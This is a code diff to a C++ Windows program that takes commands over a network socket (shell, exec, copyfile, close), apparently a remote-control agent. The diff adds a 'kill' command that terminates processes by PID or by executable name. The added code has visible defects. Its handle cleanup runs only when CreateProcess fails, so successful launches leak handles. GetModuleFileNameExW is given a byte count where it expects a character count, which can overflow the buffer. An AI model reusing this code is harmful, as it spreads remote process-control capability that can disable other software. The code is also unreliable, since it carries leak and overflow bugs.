@@ -5,6 +5,7 @@
 #include <winsock2.h>
 #include <Windows.h>
 #include <GdiPlus.h>
+#include <psapi.h>
 #include <DbgHelp.h>
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
@@ -201,6 +202,8 @@ LONG WINAPI IceUnhandledExceptionFilter(struct _EXCEPTION_POINTERS* ExceptionInf
 	ZeroMemory(&pi, sizeof(pi));
 	if(!CreateProcess(szCmdLine, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
 	{
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
 	}
 
 	wchar_t szDmpPath[MAX_PATH];
@@ -464,6 +467,7 @@ static void Cmd_copyfile(vector<wstring>& args);
 static void Cmd_shell(vector<wstring>& args);
 static void Cmd_exec(vector<wstring>& args);
 static void Cmd_close(vector<wstring>& args);
+static void Cmd_kill(vector<wstring>& args);
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
@@ -489,6 +493,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	g_Cmds[L"shell"]		= Cmd_shell;
 	g_Cmds[L"exec"]			= Cmd_exec;
 	g_Cmds[L"close"]		= Cmd_close;
+	g_Cmds[L"kill"]			= Cmd_kill;
 
 	//
 	char path[MAX_PATH];
@@ -775,4 +780,52 @@ void Cmd_close(vector<wstring>& args)
 		closesocket(g_hClient);
 		g_hClient = INVALID_SOCKET;
 	}
+}
+
+void Cmd_kill(vector<wstring>& args)
+{
+	if(args.size()!=2)
+	{
+		NetSendLine(L"invalid parameter");
+		return;
+	}
+
+	wchar_t val[100];
+	wsprintf(val, L"%d", _wtoi(args[1].c_str()));
+	if(wcscmp(val, args[1].c_str())==0)
+	{
+		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)_wtoi(val));
+		if(hProcess)
+		{
+			TerminateProcess(hProcess, 0);
+			CloseHandle(hProcess);
+		}
+	}
+	else
+	{
+		DWORD dwPIDs[1000];
+		DWORD dwSize;
+		if(EnumProcesses(dwPIDs, sizeof(dwPIDs), &dwSize))
+		{
+			for(DWORD i=0; i<dwSize/sizeof(DWORD); i++)
+			{
+				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPIDs[i]);
+				if(hProcess)
+				{
+					wchar_t file[MAX_PATH];
+					if(GetModuleFileNameExW(hProcess, NULL, file, sizeof(file))>0)
+					{
+						wchar_t* name = wcsrchr(file, L'\\');
+						if(name && wcsicmp(name+1, args[1].c_str())==0)
+						{
+							TerminateProcess(hProcess, 0);
+						}
+					}
+					CloseHandle(hProcess);
+				}
+			}
+		}
+	}
+
+	NetSendLine(L"done");
 }
